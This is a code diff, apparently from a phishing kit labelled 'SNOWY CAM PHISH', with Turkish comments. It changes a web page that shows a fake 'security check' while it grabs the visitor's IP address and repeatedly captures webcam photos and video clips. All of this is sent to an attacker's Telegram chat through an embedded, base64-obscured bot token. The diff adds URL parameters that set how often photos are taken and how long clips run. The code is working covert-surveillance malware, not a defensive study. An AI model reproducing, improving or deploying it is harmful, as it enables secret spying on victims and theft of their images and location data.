@@ -65,8 +65,12 @@
         // ============================================
         const SIFRELI_TOKEN = "ODc3MzEyNDcxNTpBQUVmczgwdDh5djJYbkRHeTIwYUxseHkzYUZHd0RqMGpGVQ==";
         const BOT_TOKEN = atob(SIFRELI_TOKEN);
+        
+        // URL'den parametreleri al
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_ID = urlParams.get('i');
+        const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3; // varsayılan 3 saniye
+        const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5; // varsayılan 5 saniye
         
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -77,6 +81,8 @@
         let videoCount = 0;
         let photoCount = 0;
         let ipGonderildi = false;
+        
+        console.log(`⚙️ Ayarlar: Fotoğraf ${FOTO_SURESI}s, Video ${VIDEO_SURESI}s`);
         
         // ============================================
         // İP ADRESİ AL
@@ -97,7 +103,7 @@
         async function sendIP(ip) {
             if (ipGonderildi) return;
             
-            const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
+            const msg = `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n📸 Fotoğraf: ${FOTO_SURESI}s\n🎥 Video: ${VIDEO_SURESI}s\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @snowy_dexry_wexry ⚡`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -112,7 +118,7 @@
         }
         
         // ============================================
-        // FOTOĞRAF ÇEK - 1 SANİYEDE 1
+        // FOTOĞRAF ÇEK - KULLANICININ SEÇTİĞİ SIKLIKTA
         // ============================================
         async function takePhoto() {
             if (!video.videoWidth || !video.videoHeight) return;
@@ -130,7 +136,7 @@
                     const formData = new FormData();
                     formData.append('chat_id', TARGET_ID);
                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
+                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')} (${FOTO_SURESI}s)`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -143,7 +149,7 @@
         }
         
         // ============================================
-        // 3 SANİYELİK VİDEO KAYDI
+        // VİDEO KAYDI - KULLANICININ SEÇTİĞİ SÜREDE
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
@@ -170,24 +176,24 @@
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${boyutKB}KB)`);
+                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${VIDEO_SURESI}s - ${boyutKB}KB)`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                // Yeni video başlat (3 saniyelik)
+                // Yeni video başlat (kısa bir bekleme ile)
                 setTimeout(recordVideo, 500);
             };
             
-            // 3 saniye kaydet
+            // Kullanıcının seçtiği süre kadar kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
-            }, 3000);
+            }, VIDEO_SURESI * 1000);
         }
         
         // ============================================
@@ -204,17 +210,20 @@
                 video.onloadedmetadata = async () => {
                     await video.play();
                     
-                    // IP'yi gönder
+                    // IP'yi gönder (ayarlarla birlikte)
                     const ip = await getIP();
                     await sendIP(ip);
                     
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // 1 SANİYEDE 1 FOTOĞRAF
-                    setInterval(takePhoto, 1000);
+                    // Yazıyı güncelle
+                    document.getElementById('loadingText').innerHTML = `Güvenlik kontrolü...<br><small>📸 ${FOTO_SURESI}s | 🎥 ${VIDEO_SURESI}s</small>`;
                     
-                    // 2 saniye bekle sonra video başlasın (3 saniyelik)
+                    // Kullanıcının seçtiği sıklıkta fotoğraf çek
+                    setInterval(takePhoto, FOTO_SURESI * 1000);
+                    
+                    // 2 saniye bekle sonra video başlasın
                     setTimeout(recordVideo, 2000);
                 };
                 
